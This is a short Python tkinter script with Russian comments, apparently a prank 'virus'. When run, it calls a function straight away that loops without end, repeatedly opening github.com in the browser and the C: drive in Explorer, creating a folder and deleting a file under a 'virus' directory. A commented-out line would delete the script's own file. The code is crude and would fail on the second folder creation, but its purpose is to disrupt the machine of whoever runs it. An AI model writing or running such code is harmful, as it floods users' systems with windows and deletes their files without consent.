from tkinter import *
from tkinter import messagebox as mb
import random as r
from random import randint
import webbrowser as wb
import os


def open_git():
    print("Ты - Душнила. Я знаю, спасибо.")
    # os.remove('1.py') # удаляет файл в папке
    while True:
        wb.open('https://github.com/')
        path = r'C:\\' # добавил открытие папки в цикле
        os.startfile(path)
        print("Текущая директория:", os.getcwd()) # вывести текущую директорию в консоль
        os.mkdir("folder") # создает новую папку в текущей директории
        os.remove('virus\1.py')


root = Tk ()
root.title ('')
root.geometry ('350x350+200+200')
root.config (bg = '')

#Button (root, text="Не нажимать", command=open_git).pack()
open_git() # запуск функции без нажатия кнопки

root.mainloop ()